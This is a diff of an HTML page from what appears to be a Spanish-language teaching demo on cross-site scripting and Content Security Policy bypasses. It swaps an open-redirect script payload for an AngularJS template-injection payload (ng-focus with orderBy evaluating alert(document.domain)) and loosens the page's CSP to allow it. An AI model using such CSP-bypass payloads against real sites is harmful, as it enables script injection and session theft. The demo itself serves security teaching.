@@ -21,18 +21,18 @@
   <link rel="stylesheet" href="../node_modules/@highlightjs/cdn-assets/styles/dark.min.css">
 
   
-  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://static.example.com/js/jquery@3.6.4/dist/jquery.min.js;">
+  <meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; &#39;unsafe-eval&#39; https://www.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;">
   
 
   <script src="js/darkmode.js"  defer></script>
   <title>
     
-09 - CSP bypass usando un open redirect
+03 - CSP bypass usando AngularJS
 
   </title>
 
   
-<meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://static.example.com/js/jquery@3.6.4/dist/jquery.min.js;">
+<meta id="csp" http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; &#39;unsafe-eval&#39; https://www.google.com https://*.gstatic.com https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js;">
 <script src="js/csp.js"  defer></script>
 <script src="js/showpayload.js"  defer></script>
 
@@ -47,7 +47,7 @@
         <ul>
           <h1>
             
-09 - CSP bypass usando un open redirect
+03 - CSP bypass usando AngularJS
 
           </h1>
         </ul>
@@ -58,7 +58,7 @@
       </nav>
       
 
-<p class="pico-background-jade-500">Ejemplo no vulnerable</p>
+<p class="pico-background-red-500">Ejemplo vulnerable</p>
 
 
     </header>
@@ -86,7 +86,7 @@
   </h2>
   <pre><code id="payload-content" class="language-html"></code></pre>
   <button id="inject">Inject</button>
-  <a href="09.html" role="button" class="secondary outline">Restart</a>
+  <a href="angularjs.html" role="button" class="secondary outline">Restart</a>
 </section>
 
 <section>
@@ -105,7 +105,11 @@
   <pre><code id="errors"></code></pre>
 </section>
 
-<template id="payload-template"><script src="/_/redirect/?https://cdn.jsdelivr.net/gh/stsewd/charla-csp-xss@main/js/test.js"></script></template>
+<template id="payload-template"><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+
+<div ng-app>
+  <input ng-focus="$event.composedPath()|orderBy:'alert(document.domain)'" value="Click me!">
+</div></template>
 
 
 
@@ -113,7 +117,7 @@
   <nav>
     <ul>
       <li>
-        <a href="08.html" role="button" class="secondary outline" >
+        <a href="inline-js-fixed.html" role="button" class="secondary outline" >
           <i class="fa-solid fa-chevron-left"></i>
           anterior
         </a>
@@ -126,7 +130,7 @@
     </ul>
     <ul>
       <li>
-        <a href="10.html" role="button" class="secondary outline" >
+        <a href="angularjs-fixed.html" role="button" class="secondary outline" >
           siguiente
           <i class="fa-solid fa-chevron-right"></i>
         </a>
